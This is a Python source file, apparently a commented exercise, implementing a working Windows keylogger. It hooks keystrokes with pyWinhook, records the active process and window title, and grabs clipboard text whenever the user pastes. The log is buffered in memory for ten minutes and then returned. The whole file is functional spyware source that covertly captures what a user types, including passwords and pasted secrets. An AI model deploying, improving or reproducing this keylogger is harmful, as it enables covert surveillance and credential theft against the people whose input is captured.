# Windows keylogger, tracks the active application and window title, and extracts text from the system clipboard when the user pastes

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10 # sets of timeout limit of 10 minutes

class Keylogger:
    def __init__(self):
        self.current_window = None # sets current window to None to track context changes

    # capture the active process and window title
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow() # calls the Windows API to get the current focused window
        pid = c_ulong(0) # initializes a long to store the process ID
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # asks Windows what pid owns the active window
        process_id = f'{pid.value}' # converts the retreived pid from a long to a string

        # since we're calling the Windows OS API, we need to act like we're programming in C
        # we'll need to hand this pointer to the API (which is written in C)
        executable = create_string_buffer(512) 

        # figure out what process the pid refers to
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid) # define a handle to our target process
        windll.psapi.GetModuleBaseNameA(
                    h_process, None, byref(executable), 512) # grab the base file name of the executable running the process
        
        window_title = create_string_buffer(512) # once again we need to create a pointer because we're working with an API written in C
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # pulls the title of the active window
        try:
            self.current_window = window_title.value.decode() # decodes the title into a python string, saving it to the window_title pointer
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown') # error message if the title can't be found

        print('\n', process_id,
            executable.value.decode(), self.current_window) # print out metadate showing pid, executable name, and window title 

        windll.kernel32.CloseHandle(hwnd) # clean up, closes both handles that we used earlier
        windll.kernel32.CloseHandle(h_process) # space for handles are limited, so clean up is important

    # triggered every time a key is pressed
    def mykeystroke(self, event):
        if event.WindowName != self.current_window: # checks if the user has changed windows
            self.get_current_process() # if they did, grab the new window and process info
        if 32 < event.Ascii < 127: # checks if the ASCII value is a standard printable character
            print(chr(event.Ascii), end='') # if it is, print to stdout
        else: # handles all non printable characters
            if event.Key == 'V': # catches ctrl + V pasting
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData() # pull whatever text is in the clipboard
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}') # save what was pulled out of the clipboard
            else:
                print(f'{event.Key}') # save the non-printable key ( [return] or [shift]
        return True # allow the keystroke event to pass normally to the OS to prevent lag

def run():
    save_stdout = sys.stdout # saves a reference to the standard output stream
    sys.stdout = StringIO() # redirects stdout (and all the prints in this script) to an in memory string buffer instead of the terminal

    kl = Keylogger()
    hm = pyHook.HookManager() 
    hm.KeyDown = kl.mykeystroke # every time a key is pressed, mykeystroke() will run
    hm.HookKeyboard() # activates the keyboard hook
    while time.thread_time() < TIMEOUT: # as long as we haven't timed out:
        pythoncom.PumpWaitingMessages() # make sure the Windows COM message pump keeps running, transfering events/inputs from the OS to the application
    log = sys.stdout.getvalue() # takes all the stdout data (all those prints) from the buffer and saves it to 'log'
    sys.stdout = save_stdout # restores stdout back to the terminal  
    return log 

if __name__ == '__main__':
    print(run())
    print('done.')

